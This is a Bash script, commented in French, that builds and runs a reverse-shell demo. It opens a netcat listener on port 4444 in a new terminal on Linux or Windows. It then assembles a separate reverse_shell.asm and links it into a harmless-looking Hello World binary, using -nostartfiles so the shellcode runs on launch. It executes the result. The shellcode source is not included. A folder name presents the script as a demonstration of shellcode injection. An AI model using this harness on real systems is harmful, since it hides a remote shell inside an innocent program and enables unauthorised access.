#!/bin/bash

# Fonction pour vérifier les dépendances
check_dependencies() {
    command -v nasm >/dev/null 2>&1 || { echo >&2 "nasm n'est pas installé. Veuillez installer nasm."; exit 1; }
    command -v nc >/dev/null 2>&1 || { echo >&2 "netcat (nc) n'est pas installé. Veuillez installer netcat."; exit 1; }
    command -v gcc >/dev/null 2>&1 || { echo >&2 "gcc n'est pas installé. Veuillez installer gcc."; exit 1; }
}

# Fonction pour ouvrir un terminal et démarrer nc sur Linux
open_terminal_and_listen() {
    if command -v gnome-terminal &> /dev/null; then
        gnome-terminal -- nc -lvp 4444
    elif command -v konsole &> /dev/null; then
        konsole -e nc -lvp 4444 &
    elif command -v xfce4-terminal &> /dev/null; then
        xfce4-terminal -e "nc -lvp 4444" &
    elif command -v xterm &> /dev/null; then
        xterm -e "nc -lvp 4444" &
    else
        echo "Aucun terminal compatible trouvé. Veuillez installer gnome-terminal, konsole, xfce4-terminal ou xterm."
        exit 1
    fi
}

# Fonction pour ouvrir un terminal et démarrer nc sur Windows
open_terminal_and_listen_windows() {
    if command -v powershell.exe &> /dev/null; then
        powershell.exe -Command "Start-Process powershell -ArgumentList 'nc -lvp 4444' -NoNewWindow"
    elif command -v cmd.exe &> /dev/null; then
        cmd.exe /c start cmd.exe /k "nc -lvp 4444"
    else
        echo "Aucun terminal compatible trouvé pour Windows. Veuillez installer cmd.exe ou powershell.exe."
        exit 1
    fi
}

# Vérifier les dépendances
check_dependencies

# Vérifier si le script est exécuté sous Windows ou Linux
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    # Ouvrir un port en écoute dans un nouveau terminal uniquement si le port n'est pas déjà ouvert
    if ! nc -z localhost 4444; then
        open_terminal_and_listen
    fi
elif [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
    # Ouvrir un port en écoute dans un nouveau terminal uniquement si le port n'est pas déjà ouvert
    if ! nc -z localhost 4444; then
        open_terminal_and_listen_windows
    fi
else
    echo "Système d'exploitation non supporté."
    exit 1
fi

# Créer le dossier de sortie
mkdir -p execution_du_code_ce_dossier_ne_sert_qu_a_montrer_comment_le_shellcode_est_injecte

# Assembler le shellcode
nasm -f elf64 reverse_shell.asm -o execution_du_code_ce_dossier_ne_sert_qu_a_montrer_comment_le_shellcode_est_injecte/reverse_shell.o

# Créer le fichier source C minimal
cat <<EOF > execution_du_code_ce_dossier_ne_sert_qu_a_montrer_comment_le_shellcode_est_injecte/main.c
#include <stdio.h>

int main() {
    printf("Hello, World!\\n");
    return 0;
}
EOF

# Compiler et lier le programme C avec le shellcode
gcc -nostartfiles -o ./shellcode_runner execution_du_code_ce_dossier_ne_sert_qu_a_montrer_comment_le_shellcode_est_injecte/main.c execution_du_code_ce_dossier_ne_sert_qu_a_montrer_comment_le_shellcode_est_injecte/reverse_shell.o -no-pie

# Exécuter le programme compilé
./shellcode_runner

# Nettoyer les fichiers temporaires de la racine
rm -f main.c reverse_shell.o
